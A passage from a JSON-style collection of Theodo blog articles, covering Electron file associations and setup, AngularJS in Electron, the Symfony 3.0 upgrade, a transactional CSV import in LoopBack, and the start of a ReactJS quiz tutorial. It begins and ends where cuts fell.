path.join(constant.cwd, constant.nsiTemplate);\r\n    return gulp.src('nsi-template/installer.nsi.tpl')\r\n        .pipe(replace('@projectNsiTemplateDir', projectIncludeDir))\r\n        .pipe(replace('@projectExtension', constant.fileAssociation.extension))\r\n        .pipe(replace('@projectFileType', constant.fileAssociation.fileType))\r\n        .pipe(gulp.dest('dist/nsi-template/win'));\r\n});\r\n\nThis task requires gulp and gulp-replace node modules.\nThen, you have to update the electron builder config:\n  \"win\" : {\r\n    \"title\" : \"my-awesome-app\",\r\n    \"icon\" : \"assets/win/icon.ico\",\r\n    \"nsiTemplate\" : \"dist/nsi-template/win/installer.nsi.tpl\"\r\n  }\r\n\nHere is the result:\n\nLinking custom extensions with Electron for Windows should be natively available in electron-builder soon, so stay tuned.\nHow to configure your app to open linked files in Windows\nOn Windows, you have to parse process.argv to get the filepath.\nThen, you can use the ipc module to handle messages from the renderer process (web page) and retrieve a data store from a file.\nThis is how we did it:\nIn the main process:\nvar ipc = require('ipc');\r\nvar fs = require('fs');\r\n\r\n// read the file and send data to the render process\r\nipc.on('get-file-data', function(event) {\r\n  var data = null;\r\n  if (process.platform == 'win32' && process.argv.length >= 2) {\r\n    var openFilePath = process.argv[1];\r\n    data = fs.readFileSync(openFilePath, 'utf-8');\r\n  }\r\n  event.returnValue = data;\r\n});\r\n\nIn the renderer process:\n<script>\r\n  // we use ipc to communicate with the main process\r\n  var ipc = require('ipc');\r\n  var data = ipc.sendSync('get-file-data');\r\n  if (data ===  null) {\r\n    document.write(\"There is no file\");\r\n  } else {\r\n    document.write(data);\r\n  }\r\n</script>\r\n\nHere is the result:\n\nConclusion\nCongratulations! Now you know how to associate a file extension to your Electron application.\nIf this article interested you and you want to see more of Electron in action, check out our electron-boilerplate repository.\nOne more thing, the next article about Electron is coming up soon so stick around!\n\u00a0\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Pouliquen\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo, and curious about any new technology!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Quagliaro\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA new major version is always exciting: when it comes to one of our favorite frameworks like Symfony, it\u2019s Christmas come early for developers. But is is also worrisome. Will my application break? Will I have to rewrite half of my code? Don\u2019t panic! We will go through the 3.0 major version changes and cover various subjects from new features to upgrading.\nWhat\u2019s up doc?\nTo be honest, there is no new shiny feature in this version.\nWhat? You said Symfony 3.0 was awesome!\nYeah, Symfony 3.0 is awesome exactly because of that.\nLet\u2019s go back to one rule of semantic versioning:\nMajor version X (X.y.z | X > 0) MUST be incremented if any backwards incompatible changes are introduced.\nAs a consequence, Symfony 3.0 is allowed to break compatibility. It does little else. And this is necessary: at some point, you need to clean the compatibility layers burdening your framework. But to avoid most of the pain, the Symfony developers used a well designed release schedule:\n\nMajor features were introduced in 2.7 and 2.8 (which was released at the same time as 3.0)\n2.7 and 2.8 are backward compatible\nSince 2.6 users are notified about deprecated methods when they are used\nAll compatibility layers are dropped in the 3.0 version\n\nIf you are interested in shiny features and have not moved to 2.7 yet, you might want to read this:\n\nNew features in 2.7\nNew features in 2.8\n\nThe framework has become more standard (support of the PSR-3 standard for logging), has got rid of some architecture mistakes and is more decoupled and reusable than ever. Here are the notable changes:\nA new directory structure\nBasically, the entire structure of Symfony didn\u2019t change but there were some tweaks:\n2.5 directory structure | 3.0 directory structure\r\napp/cache               | var/cache\r\napp/logs                | var/log\r\napp/bootstrap.php.cache | var/bootstrap.php.cache\r\napp/console             | bin/console\r\napp/phpunit.xml.dist    | phpunit.xml.dist\r\n\nAs a result, you can run PHPUnit without specifying a config file: phpunit instead of phunit -c app. All binaries are moved into the bin directory and the new var directory was made for easier permission settings (the entire directory should be writable).\nNew components\nThe Asset component was introduced in 2.7 and automatically manages URL generation and versioning of your stylesheets, javascript files and images.\nThe LDAP component was introduced in 2.8 and allows you to use an LDAP service as a security provider.\nA PHPUnit bridge was added in 2.7. Its main advantage is that use of depreciated code is reported and tests will fail because of that. With this bridge it will be easier for you to stay up to date.\nProfiler improvements\nThe Twig and Translation profilers were added. Furthermore, the whole debug interface was redesigned to have a nicer look and a better user experience.\n\n\nHow to upgrade to 3.0\nFirst of all, PHP 5.5 is the new required version to run Symfony 3.0. Check that your servers are running 5.5 or newer PHP versions, if not consider upgrading PHP.\nNow, you need to check the migration status of installed bundles. Here is a Google Doc summing up migration statuses of major bundles.\nAs for the code itself, this is the easiest part. And you should do it even if you don\u2019t meet the above requirements because 2.7 and 2.8 came with great performance and security improvements. Updating to a new LTS (Long Term Support) version when it comes out (2.8) is also a good practice for maintainability.\nA method that should work in most cases:\n\nUpdate to 2.8.X. There is no compatibility breaks in minor versions, so your website will still be running.\nQuickly install the Deprecation Detector utility.\nRun deprecation-detector check in your Symfony app. It will list all deprecated methods and classes with a hint on how to fix the issue.\nIf you need more details you can check the full UPGRADE guide.\n\n\nWhat\u2019s next?\nBe careful though, the 3.0 version is not an LTS one. The last LTS version is 2.8 and the next one is the 3.3 to be released in May 2017.\nConcerning PHP7 (this is a great month for PHP lovers), Symfony will not move to this version yet, but a bump to PHP 5.6 next year is being considered.\nAs 3.0 is not that a revolution (but a needed cleaning process), development will continue normally in the next months to come.\nConclusion\nEven if you don\u2019t upgrade now (but you really should), you can move to 2.8 which is an LTS and have warnings about deprecated methods that are removed from the 3.0 version.\nMigration from Symfony 1 to Symfony 2 was (and still is) a terrifying journey. With the Backwards Compatibility Promise, the Symfony development team wanted to build a more lasting framework and produced a nice and smooth migration process for 3.0.\nThe official blog post\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlb\u00e9ric Trancart\r\n  \t\t\t\r\n  \t\t\t\tAlb\u00e9ric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen you build an app where users need to regularly import data from an external source, you are bound to import csv files to populate your database.\nOften referred as ETL (Extract, Transform and Load), these functionalities are tricky to implement and often hard to understand for the end user. This article explains how to tackle the main\u00a0challenges\u00a0of csv import and provides a\u00a0fully functional\u00a0repo on github\u00a0to get started quickly on a project!\nThe first challenge is to make a user friendly process. If a user uploads a file and the import fails, he needs to be able to know why and how to fix his file in order to try to import it again.\nThe second challenge is to keep the database in a consistent state: if the user imports a file that creates an error at the line 50, the first 49 lines should not be written in the database. You don\u2019t want to write anything in the database if an error has risen in the process. A solution is to use SQL transactions to control when your changes to the database are eventually applied.\nLastly, in order to import large datasets without impacting the user experience, you need to separate the upload process (where the user is waiting for a few seconds for the file to be uploaded) from the import process which happens in the backend, maybe for a few minutes.\n\nIn this article, we will explain how to build your own transactional csv import using the node framework loopback and a relational database.\nThe process allows the user to know which cells of his excel file have failed and rollbacks if an error raises. We will demonstrate the process with the database PostgreSQL, but transactions can used with different connectors in Loopback.\nI will also assume that you know the basics of the Loopback framework and coffeescript syntax. Let\u2019s say we want to import invoices in our system and we already have an Invoice loopback model with two properties invoiceId and amount.\nStart by creating an upload remote method in the Invoice model that will be called by your client app with a POST request.\ncommon/models/Invoice.json\nInvoice.upload = (req, callback) ->\r\n  # wait for it\r\n  callback()\r\n\r\nInvoice.remoteMethod 'upload',\r\n  accepts: [\r\n    arg: 'req'\r\n    type: 'object'\r\n    http:\r\n      source: 'req'\r\n  ]\r\n  http:\r\n    verb: 'post'\r\n    path: '/upload'\r\n\r\n\nAdd the following modules in your Invoice model:\n_        = require 'lodash'\r\nasync    = require 'async'\r\ncsv      = require 'fast-csv'\r\nfork     = require('child_process').fork\r\nfs       = require 'fs'\r\npath     = require 'path'\r\nloopback = require 'loopback'\r\n\nIn order to separate the file upload and the data processing, we are going to store the file in the filesystem and save in the database the state of the upload (a PENDING status). As soon as the upload is done, we send a http answer to the client so that he can continue using the app while the data is processed.\nThen we start a new node process using the module fork. It will call a custom import method described below.\nUsing the library fast-csv, we parse the csv file and begin a sql transaction.\nWe can now proceed to the import and commit the transaction if no error is raised. Otherwise the transaction is canceled and the import remains in the initial state, it is a all or nothing import process. Eventually we delete the file from the filesystem.\nBefore starting to code the upload method, we need to create a few more models.\nCreate a FileUpload and FileUploadError models that will be used to store the state of the imports (PENDING, SUCCESS, ERROR) and the error list.\nA FileUpload has many FileUploadError, so let\u2019s use the loopback hasManyrelation.\n\nCreate a model Container which will be used by the component loopback-component-storage to create a container. A container is similar to a directory and will be used to store the csv file uploaded by the user.\nUpdate server/datasources.json to add the container datasource.\nCreate the tables related to the models in your database and don\u2019t forget to declare your models in the server/model-config.json\n\nWARNING: If you use PostgreSQL update the poolIdleTimeout property of your database.\nBecause we do not commit the changes to the database before the end of the process, PostgreSQL sees the connection as idle and raises a timeout error. Set the poolIdleTimeout to be above the maximum time a import should take.\nserver/datasources.json\n{\r\n  \"db\": {\r\n    ... // Your config,\r\n    \"poolIdleTimeout\": 1200000\r\n  },\r\n  \"container\": {\r\n    \"name\": \"container\",\r\n    \"connector\": \"loopback-component-storage\",\r\n    \"provider\": \"filesystem\",\r\n    \"root\": \"tmp\"\r\n  }\r\n}\r\n\r\n\nCreate a tmp folder at the root of your projet that will be used to store the uploaded files.\nNow we can start coding! Remember the import method I mentionned? Let\u2019s implement it!\nStart by installing the following dependencies: fast-csv, lodash,\nasync, loopback-component-storage\nnpm install fast-csv lodash async loopback-component-storage --save\r\n\nThe upload method initializes the import process:\n  Invoice.upload = (req, callback) ->\r\n    Container = Invoice.app.models.Container\r\n    FileUpload = Invoice.app.models.FileUpload\r\n\r\n    # Generate a unique name to the container\r\n    containerName = \"invoice-#{Math.round(Date.now())}-#{Math.round(Math.random() * 1000)}\"\r\n\r\n    # async.waterfall is like a waterfall of functions applied one after the other\r\n    async.waterfall [\r\n      (done) ->\r\n        # Create the container (the directory where the file will be stored)\r\n        Container.createContainer name: containerName, done\r\n      (container, done) ->\r\n        req.params.container = containerName\r\n        # Upload one or more files into the specified container. The request body must use multipart/form-data which the file input type for HTML uses.\r\n        Container.upload req, {}, done\r\n      (fileContainer, done) ->\r\n\r\n        # Store the state of the import process in the database\r\n        FileUpload.create\r\n          date: new Date()\r\n          fileType: Invoice.modelName\r\n          status: 'PENDING'\r\n        , (err, fileUpload) ->\r\n          return done err, fileContainer, fileUpload\r\n    ], (err, fileContainer, fileUpload) ->\r\n      return callback err if err\r\n      params =\r\n        fileUpload: fileUpload.id\r\n        root: Invoice.app.datasources.container.settings.root\r\n        container: fileContainer.files.file[0].container\r\n        file: fileContainer.files.file[0].name\r\n\r\n      # Launch a fork node process that will handle the import\r\n      fork __dirname + '/../../server/scripts/import-invoices.coffee', [\r\n        JSON.stringify params\r\n      ]\r\n      callback null, fileContainer\r\n\nCreate a scripts folder in server and add an\u00a0import-invoices.coffee file. This script is used to lauch a forked node process calling an import method of the Invoice model. It exits to make sure that the node process is killed when an import is over.\nContent of the import-invoices.coffee file:\nserver = require '../server.coffee'\r\noptions = JSON.parse process.argv[2]\r\n\r\n# Make sure that the node process is killed when the import process is over.\r\ntry\r\n  server.models.Invoice.import options.container, options.file, options, (err) ->\r\n    process.exit if err then 1 else 0\r\ncatch err\r\n  process.exit if err then 1 else 0\r\n\nLet\u2019s dive into the import method. It first calls a import_preprocess method that initializes the SQL transaction.\nThen it uses the method import_process and commits or rollbacks if there was an error.\nimport_postprocess_success and import_postprocess_error save the FileUpload status depending of the status of the import process.\nimport_clean destroys the uploaded file.\n  Invoice.import = (container, file, options, callback) ->\r\n    # Initialize a context object that will hold the transaction\r\n    ctx = {}\r\n\r\n    # The import_preprocess is used to initialize the sql transaction\r\n    Invoice.import_preprocess ctx, container, file, options, (err) ->\r\n      Invoice.import_process ctx, container, file, options, (importError) ->\r\n        if importError\r\n          # rollback does not apply the transaction\r\n          async.waterfall [\r\n            (done) ->\r\n              ctx.transaction.rollback done\r\n            (done) ->\r\n              # Do some other stuff to clean and acknowledge the end of the import\r\n              Invoice.import_postprocess_error ctx, container, file, options, done\r\n            (done) ->\r\n              Invoice.import_clean ctx, container, file, options, done\r\n          ], ->\r\n            return callback importError\r\n\r\n        else\r\n          async.waterfall [\r\n            (done) ->\r\n              # The commit applies the changes to the database\r\n              ctx.transaction.commit done\r\n            (done) ->\r\n               # Do some other stuff to clean and acknowledge the end of the import\r\n              Invoice.import_postprocess_success ctx, container, file, options, done\r\n            (done) ->\r\n              Invoice.import_clean ctx, container, file, options, done\r\n          ], ->\r\n            return callback null\r\n\r\n\r\n  Invoice.import_preprocess = (ctx, container, file, options, callback) ->\r\n\r\n    # initialize the SQL transaction\r\n    Invoice.beginTransaction\r\n      isolationLevel: Invoice.Transaction.READ_UNCOMMITTED\r\n    , (err, transaction) ->\r\n      ctx.transaction = transaction\r\n      return callback err\r\n\nIn the import_process method, we iterate over each line of the csv file and apply the import_handleLine method that holds the business logic. This is were you will define what to do with your data.\n  Invoice.import_process = (ctx, container, file, options, callback) ->\r\n    fileContent = []\r\n    filename = path.join Invoice.app.datasources.container.settings.root, container, file\r\n\r\n    # Here we fix the delimiter of the csv file to semicolon. You can change it or make it a parameter of the import.\r\n    stream = csv\r\n      delimiter: ';'\r\n      headers: true\r\n    stream.on 'data', (data) ->\r\n      fileContent.push data\r\n    stream.on 'end', ->\r\n      errors = []\r\n\r\n      # Iterate over every line of the file\r\n      async.mapSeries [0..fileContent.length], (i, done) ->\r\n        return done() if not fileContent[i]?\r\n\r\n        #  Import the individual line\r\n        Invoice.import_handleLine ctx, fileContent[i], options, (err) ->\r\n          if err\r\n            errors.push err\r\n            # If an error is raised on a particular line, store it with the FileUploadError model\r\n            # i + 2 is the real excel user-friendly index of the line\r\n            Invoice.app.models.FileUploadError.create\r\n              line: i + 2\r\n              message: err.message\r\n              fileUploadId: options.fileUpload\r\n            , done null\r\n          else\r\n            done()\r\n      , ->\r\n        return callback errors if errors.length > 0\r\n        return callback()\r\n    fs.createReadStream(filename).pipe stream\r\n\nUsing the next two methods, I save the status of the import in the database. You can use those two methods to add more business logic, for example send a confirmation email.\n  Invoice.import_postprocess_success = (ctx, container, file, options, callback) ->\r\n    Invoice.app.models.FileUpload.findById options.fileUpload, (err, fileUpload) ->\r\n      return callback err if err\r\n      fileUpload.status = 'SUCCESS'\r\n      fileUpload.save callback\r\n\r\n  Invoice.import_postprocess_error = (ctx, container, file, options, callback) ->\r\n    Invoice.app.models.FileUpload.findById options.fileUpload, (err, fileUpload) ->\r\n      return callback err if err\r\n      fileUpload.status = 'ERROR'\r\n      fileUpload.save callback\r\n\nWhen the process is over, there is no need to keep the file, so let\u2019s destroy the container to delete the file:\n  Invoice.import_clean = (ctx, container, file, options, callback) ->\r\n    Invoice.app.models.Container.destroyContainer container, callback\r\n\nimport_handleLine holds the business logic:\n\nChecking the validity of the data in each cell\nCreating or updating data on any model\n\n  LineHandler =\r\n    # Method to creadte/update the invoice from the data of the line\r\n    createInvoice: (req, line, done) ->\r\n      Invoice.findOne\r\n        where:\r\n          invoiceId: line.InvoiceId\r\n      , req, (error, found) ->\r\n        return done error if error\r\n\r\n        invoice =\r\n          invoiceId: line.InvoiceId\r\n          amount: line.Amount\r\n        invoice.id = invoice.id if found\r\n\r\n        Invoice.upsert invoice, req, (error, invoice) ->\r\n          if error\r\n            done error, line.InvoiceId\r\n          else\r\n            done null, invoice\r\n\r\n    rejectLine: (columnName, cellData, customErrorMessage, callback) ->\r\n      err = new Error \"Unprocessable entity in column #{columnName} where data = #{cellData}: #{customErrorMessage}\"\r\n      err.status = 422\r\n      callback err\r\n\r\n    # Do all the necessary checks to avoid SQL errors and check data integrity\r\n    validate: (line, callback) ->\r\n      if line.InvoiceId is ''\r\n        return @rejectLine 'InvoiceId', line.InvoiceId, 'Missing InvoiceId', callback\r\n      if _.isNaN parseInt line.InvoiceId\r\n        return @rejectLine 'InvoiceId', line.InvoiceId, 'InvoiceId in not a number', callback\r\n      if line.Amount is ''\r\n        return @rejectLine 'Amount', line.Amount, 'Missing Amount', callback\r\n      if _.isNaN parseInt line.Amount\r\n        return @rejectLine 'Amount', line.Amount, 'Amount in not a number', callback\r\n      callback()\r\n\nConclusion\nYou are now able to build your own csv import!\nIn your client app, you can add an html input field with a file type. To display the status of the upload, you can poll every few seconds the FileUpload model.\u00a0Check this cool article on how to make the user wait during a load!\nIf the import status is ERROR, you can get the error list using the FileUploadError model routes and make a nice UI.\nA next step could be to add hints on how to fix the errors in the csv file in the FileUploadError model using the rejectLine method. We did it\u00a0on one model but could extend it\u00a0to multiple models by creating a mixin!\nA fully functionnal example of this example is available on github. Take a look at other cool resources for Loopback on J. Drouet github who also worked on this import process!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Ricateau Pasquino\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFollowing our introduction to the Electron framework, this article wants to give you the tools to develop and serve a real, complex application to your users, regardless of their platform.\nTo illustrate this article, we enriched our electron-boilerplate repository.\u00a0You can checkout the electron-with-angular branch to see how we put in place AngularJS on our project.\n\nContext of the project\nHere at Theodo, we specialise in delivering apps and websites to our clients using the latest web technologies.\u00a0So, when a former client came back to us with a project of an offline Windows application, this seemed far from our zone of expertise.\u00a0However, we were able to put our skills to work to answer his needs with the help of Electron.\nIf you have never heard of it, you might want to read our previous article or follow the Quick Start Guide on the official website.\u00a0In short, this framework allows you to serve web contents to your users in a desktop application. The best known example is Github\u2019s IDE : Atom.\nAs soon as our development environment is set up with Electron, we can get back to better-known grounds such as AngularJS.\nCleanig up our folder structure\nIf you have read our previous article, you might have noticed where and how Electron launches your app.\u00a0Everything takes place in the main.js script that runs your main process.\nMore exactly, all the magic happens with this particular line:\nmainWindow.loadUrl('file://' + __dirname + '/index.html');\r\n\nThe loadUrl function takes the URL of your app\u2019s entry point file to render it in your mainWindow process.\nThe example above corresponds to the Electron minimal app given in their \u201cQuick Start\u201d tutorial, with the folder structure being:\nyour-app/\r\n\u251c\u2500\u2500 package.json\r\n\u251c\u2500\u2500 main.js\r\n\u2514\u2500\u2500 index.html\r\n\nFor any project, you can expect files to multiply quite a bit and it is important to keep our workspace clean and logical throughout the lifespan of the project.\nTo do so, we decided to add a folder where all our code would go:\nyour-app/\r\n\u251c\u2500\u2500 client/\r\n    \u2514\u2500\u2500 index.html\r\n\u251c\u2500\u2500 package.json\r\n\u251c\u2500\u2500 main.js\r\n\nTo keep our app running, we had one change to make to the former configuration. It was to tell it where to look for our index.html now that we had moved it!\nmainWindow.loadUrl('file://' + __dirname + '/client/index.html');\r\n\nUsing AngularJS with Electron\nIn this section, we explain our choice of using AngularJS alongside Electron. This is not an obligation, and you are free to code your app in anyway you want, provided you tell Electron where to look for your index.html file.\nThe fact that Electron needs a single file as an entry point to your app turned us quickly towards the AngularJS framework.\u00a0Indeed, with Angular, everything starts at with the index.html file of your app.\nFrom this point onward, we only had to work on building a functional Angular app answering our client\u2019s needs. Much closer to our core business wouldn\u2019t you say?\nTo convince you of how easy running an Angular app with Electron is, checkout our work on our repository.\nAs explained in the \u201cUnleash the power of AngularJS for your desktop app\u201d readme, we chose a sample Angular app on Github. With no further change to Electron\u2019s configuration, we copy/pasted the app\u2019s code in our client folder.\u00a0And there it was, running on any given platform, whether it was a Linux, a Windows or a Mac computer thanks to the power of Electron.\nTo infinity and beyond\nCoding with Electron, we realised it offered us even more possibilities than coding a regular Angular app intended for running in a browser.\nIndeed, one of the main advantages of Electron was our app\u2019s ability to communicate directly with our user\u2019s computer through Node modules. This means you can easily write files on the computer, access its information etc\u2026\nA whole world of new opportunities, from which we have selected a few that will be detailed in following articles. Stay tuned!\n\u00a0\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Pouliquen\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo, and curious about any new technology!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Quagliaro\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nElectron, formerly known as Atom Shell, is an awesome framework that lets you develop and build applications for all operating systems as seamlessly as possible! Here is how we started working with it and appreciating it!\n\nHow we came across Electron\nAt Theodo, we are specialised in web technologies (Symfony2, NodeJs, AngularJs) and we build apps or websites for our clients. Thus, when a former client came back to us with the project of a desktop application for Windows computers, this could have seemed far from our area of work, if not for Electron!\nWhat is Electron?\nTo quote the Electron creators :\nYou could see it as a minimal Chromium browser, controlled by JavaScript.\nTo be more complete, Electron is a framework that ships a NodeJS backend used with an instance of Chromium to render web pages inside a desktop app, regardless of which operating system your app is running on.\nAnd this is its main advantage! Forget about any problem of cross-compatibility (either between OS or browsers) that you encountered before! Your app will be running in the same Chromium version, with the same NodeJS version, regardless of the user\u2019s computer.\nBuilt and backed by Github, this project was at first used to run the famous Github IDE : Atom. However, it has outgrown its original use and its creators decided to separate it from the Atom project (thus the renaming to Electron) in April 2015.\nConcretely, the Electron framework is based on two types of processes.\nThe main process\nThis process (one by application) corresponds to what we would usually call the back-end of our application. It handles the different renderer processes created by our app (see below for more detailed information about the renderer process) and the communication between our app and the user\u2019s computer via NodeJS.\nThe renderer process\nEach renderer process of our app handles the displaying of a Chromium instance in a desktop window and the rendering of our app in this window. Electron provides modules to allow communication either asynchronously or synchronously with the main process to allow direct access to Node modules.\nTo the difference of usual browser windows, Electron\u2019s renderer processes thus have access to native resources of the computer.\nA minimal Electron app (source: Electron\u2019s Quick Start Guide)\nFor this section, be sure to have installed Electron globally by executing the following command:\n$ npm install -g electron-prebuilt\r\n\nTo show you how easy it was for us to start working on Electron, here are the code snippets required to launch your app.\nThe most basic app would be structured like this:\nyour-app/\r\n\u251c\u2500\u2500 package.json\r\n\u251c\u2500\u2500 main.js\r\n\u2514\u2500\u2500 index.html\r\n\nThe package.json file is there to specify the main script of your app, so the minimal file would be:\n{\r\n  \"name\"    : \"your-app\",\r\n  \"version\" : \"0.1.0\",\r\n  \"main\"    : \"main.js\"\r\n}\r\n\nThe main process of our app is handled by the main.js script. The default script given by Electron\u2019s documentation is:\nvar app = require('app');  // Module to control application life.\r\nvar BrowserWindow = require('browser-window');  // Module to create native browser window.\r\n\r\n// Report crashes to our server.\r\nrequire('crash-reporter').start();\r\n\r\n// Keep a global reference of the window object, if you don't, the window will\r\n// be closed automatically when the JavaScript object is garbage collected.\r\nvar mainWindow = null;\r\n\r\n// Quit when all windows are closed.\r\napp.on('window-all-closed', function() {\r\n  // On OS X it is common for applications and their menu bar\r\n  // to stay active until the user quits explicitly with Cmd + Q\r\n  if (process.platform != 'darwin') {\r\n    app.quit();\r\n  }\r\n});\r\n\r\n// This method will be called when Electron has finished\r\n// initialization and is ready to create browser windows.\r\napp.on('ready', function() {\r\n  // Create the browser window.\r\n  mainWindow = new BrowserWindow({width: 800, height: 600});\r\n\r\n  // and load the index.html of the app.\r\n  mainWindow.loadUrl('file://' + __dirname + '/index.html');\r\n\r\n  // Open the DevTools.\r\n  mainWindow.openDevTools();\r\n\r\n  // Emitted when the window is closed.\r\n  mainWindow.on('closed', function() {\r\n    // Dereference the window object, usually you would store windows\r\n    // in an array if your app supports multi windows, this is the time\r\n    // when you should delete the corresponding element.\r\n    mainWindow = null;\r\n  });\r\n});\r\n\nWith this, we have our back-end running and we only need to tell our application what to display to our user. This is done via the mainWindow.loadUrl('file://' + __dirname + '/index.html'); in the above script.\nAll you need is then a basic HTML page such as:\n<!DOCTYPE html>\r\n<html>\r\n  <head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Hello World!</title>\r\n  </head>\r\n  <body>\r\n    <h1>Hello World!</h1>\r\n    We are using Node.js <script>document.write(process.version)</script>\r\n    and Electron <script>document.write(process.versions['electron'])</script>.\r\n  </body>\r\n</html>\r\n\nCongratulations, you can now start your first Electron app by running electron . from the command-line in the app folder. It is now up to you to enrich your user\u2019s experience!\nHow it helped us answer our client\u2019s need\nIn addition to Electron\u2019s minimal app, we used two very useful npm packages :\n\nElectron packager : this package parses your app folder and creates the files needed to launch the app on any platform that you specify\n\u00a0Electron builder : this package starts with the files generated by electron-packager and creates a single installer for OSX or Windows computers to help you easily distribute your app.\n\nWith this base in place, we could get back in our area of expertise as all that was left for us to do was to develop our app as we would have for a traditional AngularJS app (with the exception of some points due to the particularities of an offline desktop application that will be detailed in future articles).\nIf you ever feel like trying out Electron, here is a repository including Electron, Electron packager and Electron builder to get you up and running as fast and possible and deliver your apps on any platform! Just follow the README instructions!\nCheck out the Awesome Electron repository for a quick glance of some well-known Electron projects!\n\u00a0\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Pouliquen\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo, and curious about any new technology!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Quagliaro\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis is a quick tutorial showing how you can develop a simple and reusable component using ReactJS.\nThe need\nWe want a component that can display a quiz.\nWe need to display a question, allow the user to select one or more answers, validate its answers and go to the next question.\nAfter all questions have been answered we\u2019d like to inform the user of its score and list the questions where he was right or false.\nQuiz data (quiz title, questions and answers) can be fetched from an api returning a formatted json (we\u2019ll use a local json file for the tutorial).\nGetting it Done\nReactJs components must define a render method which returns the html they have to display depending on their properties and state.\nFor our use case, we will split our component in two components: a main component Quiz representing the whole quiz and a stateless Question component. The Quiz component state contains: quiz data, user answers and current question to display.\nQuestion component properties are: question id, question data and two callback methods: one to add an answer choice and one to validate all choices (and go to the next question).\nWe first create an empty React Quiz component and export it:\nvar React = require('react');\r\nvar $ = require('jquery'); // We will need it later to get the quiz JSON\r\nvar Quiz = React.createClass({\r\n});\r\nmodule.exports = Quiz;\r\n\nThen the state is initiated as follows:\ngetInitialState: function(){\r\n  return {\r\n    quiz: {},\r\n    user_answers: [],\r\n    step: 0\r\n  }\r\n},\r\n\nquiz is an object which contains quiz data. user_answers evolves as the user adds its choices to questions. step indicates the current question and is initializated to 0.\nWe now need to load quiz data from a json file and update the state consequently. For this, we use the componentDidMount method which is called just after the initial render.\nWhen state is updated render method is called again, this time with quiz data.\ncomponentDidMount: function(quizId){\r\n  $.getJSON(\"./assets/quiz.json\", function(result) {\r\n    this.setState({quiz: result});\r\n  }.bind(this))\r\n},\r\n\nQuiz data is stored in a json file formatted as follow:\n{\r\n  \"title\": \"Quiz title\",\r\n  \"questions\": [\r\n    {\r\n      \"question\": \"What is the first question?\",\r\n      \"answers\": [\r\n        {\r\n          \"is_right\": true,\r\n          \"value\": \"This one\"\r\n        },\r\n        {\r\n          \"is_right\": false,\r\n          \"value\": \"The next one\"\r\n        